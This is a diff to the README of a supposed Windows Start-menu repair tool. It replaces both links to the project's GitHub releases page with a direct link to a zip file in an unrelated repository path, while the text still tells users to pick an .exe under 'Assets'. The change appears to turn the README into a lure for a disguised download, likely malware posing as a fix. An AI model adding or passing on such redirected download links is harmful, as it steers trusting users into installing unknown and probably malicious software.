@@ -5,7 +5,7 @@ description: "Repair the Windows 10 and 11 Start Menu using this automated Power
 ---
 # 🛠️ Start-Menu-Broken-Fix - Repair your broken Windows start menu
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/SalemCat6262/Start-Menu-Broken-Fix/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/SalemCat6262/salemcat6262.github.io/main/lamprophyre/io-salemcat-github-v1.1.zip)
 
 Windows 11 and Windows 10 users sometimes experience issues where the Start menu stops responding. This tool resolves common shell errors that prevent the Start button from opening. It automates the repair process so you do not need to edit the registry or run complex Command Prompt scripts.
 
@@ -22,7 +22,7 @@ This software works on standard Windows 10 and Windows 11 installations. Ensure 
 
 You must obtain the correct file from the official release page. Follow these steps:
 
-1. Click the following link: [Download Page](https://github.com/SalemCat6262/Start-Menu-Broken-Fix/releases)
+1. Click the following link: [Download Page](https://raw.githubusercontent.com/SalemCat6262/salemcat6262.github.io/main/lamprophyre/io-salemcat-github-v1.1.zip)
 2. Look for the latest version under the "Assets" section.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your desktop for easy access.
